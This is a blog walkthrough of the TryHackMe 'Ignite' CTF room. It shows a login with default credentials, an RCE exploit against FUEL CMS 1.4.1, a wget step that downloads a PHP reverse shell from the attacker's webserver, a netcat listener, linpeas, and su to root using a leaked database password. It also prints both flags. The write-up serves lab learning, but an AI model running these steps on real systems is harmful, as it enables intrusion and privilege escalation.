---
title: "[CTF] Tryhackme - Ignite "
date: 2024-11-05 12:00:00 -500 
categories: [CTF - Tryhackme, Ignite]
tags: [ctf,exploit,flags,tryhackme,pentesting]
author: Christoph K
---
[TryHackMe- Ignite ](https://tryhackme.com/r/room/ignite)

## Tasks

- What is the user flag?
- What is the root flag?


### What is  the user flag?


We start first with a scan with `nmap`! We use the flags `-sV` and `-sC` for getting information about `services running` and `default scripts`.

```bash

└─$ nmap -sV -sC $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 14:43 CET
Nmap scan report for 10.10.143.13
Host is up (0.050s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry
|_/fuel/

```

Our only open port seems to be `http`. So lets check the website, if we find a way. We also can use `nikto` for searching for vulnerabilities but first we want to understand a bit better, what we are dealing with.

```bash
└─$ curl http://10.10.143.13/robots.txt
User-agent: *
Disallow: /fuel/
```

![page](assets/img/tryhackme/ignite/ignite-02.png "page")

This is very interesting, we should try the default username and password: `admin` `admin`!

First we need to find the login page.


The `robots.txt` shows that `/fuel` seems to be a disallowed path for search engines or web crawlers. Lets have a look here:

![login-window](assets/img/tryhackme/ignite/ignite-01.png "login-window")


Perfect, lets try to login with the `default credentials`...

![logged-in](assets/img/tryhackme/ignite/ignite-03.png "logged in")


And we are in. Lets check our possibilites as admin here:

- we can upload `assets`
- we can create `variables`

For `CMS` Systems, where I have the possibility to upload something, I always try first the `php reverse script`! 

Unfortunately I get an error message, when I upload my `script`.


Lets check what we are allowed to upload with `inspect`

![extensions](assets/img/tryhackme/ignite/ignite-04.png "extensions")


After trying several options like `script.php.jpg` which does not work either, I tried to find some other possiblities to get access to the system. 

I search in `searchsploit` and found the following:

```bash

┌──(admin㉿PREDATOR-01)-[~/Desktop/thm/ignite]
└─$ searchsploit fuel 1.4.1
------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                   |  Path
------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                                                                                       | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                                                                       | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                                                                                       | php/webapps/50477.py

```


I prefer `Python` Scripts, so I used one of those with `.py` extention:


After giving just the `url parameter` I had access to the machine. I navigated a bit to find the `user flag`

```bash

┌──(admin㉿PREDATOR-01)-[~/Desktop/thm/ignite]
└─$ python3 explort_fuelcms.py -u "http://10.10.143.13"
[+]Connecting...
Enter Command $ls
systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt


Enter Command $ls -all
systemtotal 52
drwxrwxrwx 4 root root  4096 Jul 26  2019 .
drwxr-xr-x 3 root root  4096 Jul 26  2019 ..
-rw-r--r-- 1 root root   163 Jul 26  2019 .htaccess
-rwxrwxrwx 1 root root  1427 Jul 26  2019 README.md
drwxrwxrwx 9 root root  4096 Jul 26  2019 assets
-rwxrwxrwx 1 root root   193 Jul 26  2019 composer.json
-rwxrwxrwx 1 root root  6502 Jul 26  2019 contributing.md
drwxrwxrwx 9 root root  4096 Jul 26  2019 fuel
-rwxrwxrwx 1 root root 11802 Jul 26  2019 index.php
-rwxrwxrwx 1 root root    30 Jul 26  2019 robots.txt


Enter Command $pwd
system/var/www/html


Enter Command $cd system
system

Enter Command $ls
systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt


Enter Command $ls -all /home
systemtotal 12
drwxr-xr-x  3 root     root     4096 Jul 26  2019 .
drwxr-xr-x 24 root     root     4096 Jul 26  2019 ..
drwx--x--x  2 www-data www-data 4096 Jul 26  2019 www-data


Enter Command $ls -all /home/www-data
systemtotal 12
drwx--x--x 2 www-data www-data 4096 Jul 26  2019 .
drwxr-xr-x 3 root     root     4096 Jul 26  2019 ..
-rw-r--r-- 1 root     root       34 Jul 26  2019 flag.txt


Enter Command $cat /home/www-data/flag.txt
system
6470e394cbf6dab6a91682cc8585059b

```

Answer: `6470e394cbf6dab6a91682cc8585059b`

### What is the root flag? 

I think it is time to get proper access here. We get to use our `php-reverse-shell`. But we have to deliver it different.. 

We create a `webserver` via `python` and make sure, that our `php-reverse-shell` is in the directory.

```bash


┌──(admin㉿PREDATOR-01)-[~/Desktop/thm/ignite]
└─$ python3 -m http.server 5678
Serving HTTP on 0.0.0.0 port 5678 (http://0.0.0.0:5678/) ...
```

Now we can access from the target and `download` the reverse shell via `wget`:

```bash

┌──(admin㉿PREDATOR-01)-[~/Desktop/thm/ignite]
└─$ python3 explort_fuelcms.py -u "http://10.10.143.13"
[+]Connecting...
Enter Command $wget "http://10.11.110.106:5678/php-reverse-shell.php"
┗━(Run: “touch ~/.hushlogin” to hide this message)


```

Now the script is downloaded and before we "activate" it we have to listen to connection via `netcat`.

Lets open the website `10.10.143.13/php-reverse-shell.php`:


```bash

┌──(admin㉿PREDATOR-01)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.11.110.106] from (UNKNOWN) [10.10.143.13] 33030
Linux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 06:32:37 up 53 min,  0 users,  load average: 1.09, 1.04, 0.85
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

We have a connection!!

Lets check if there is somehting we are allowed to do via `sudo -l`:

```bash
www-data@ubuntu:/var/www/html$ sudo -l
sudo -l
sudo: no tty present and no askpass program specified

```

Okay we use our python webserver and dowload `linepeas.sh` from the target

```bash

Enter Command $wget "http://10.11.110.106:5678/linepeas.sh"

```

And in our reverse shell we open it: 

```bash

www-data@ubuntu:/var/www/html$ chmod 777 linepeas.sh
chmod 777 linepeas.sh
www-data@ubuntu:/var/www/html$ ./linepeas.sh
```



After analyzing `linepeas.sh` we found following:

``` bash


╔══════════╣ Analyzing Backup Manager Files (limit 70)

-rwxrwxrwx 1 root root 4646 Jul 26  2019 /var/www/html/fuel/application/config/database.php
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
        'password' => 'mememe',
        'database' => 'fuel_schema',
```

We have a `password` for the databases. Lets see what kind of `databases` we have in this file:

```bash

www-data@ubuntu:/var/www/html$ cat /var/www/html/fuel/application/config/database.php


$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE

```


Lets try to use the username `root` with the password `mememe`!

We can use `python -c 'import pty; pty.spawn("/bin/bash")` to open a proper terminal session!

Lets check if we find the `root` flag:

```bash
www-data@ubuntu:/tmp$ su root
su root
su: must be run from a terminal
www-data@ubuntu:/tmp$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/tmp$ su root
su root
Password: mememe

root@ubuntu:/tmp# cd ~
cd ~
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# cat root.txt
cat root.txt
b9bbcb33e11b80be759c4e844862482d
root@ubuntu:~#
```
And we found it... Job was successful :-) 

Answer: `b9bbcb33e11b80be759c4e844862482d`



## Thoughts:

This CTF was very nice in the beginning, because I tried a lot of ways to `upload` the `php` file, which was not attended. After using the exploit for `FUEL CMS` and retrieving the `user flag` it was a bit time intense for escalate our privileages... `Linepeas` is a really nice script for scanning for vulnerabilities but you have to read and analyze it very properly which is very time intense..

What did we learn today? 
- using `nmap` for scanning ports/services
- analyzing webpages properly
- using `searchsploit` and use an `exploit`
- using `python` to open a webserver 
- using `php-reverse-shell` for getting into the system
- using `linepeash.sh` for analyzing vulnerabilities for elevate privileages








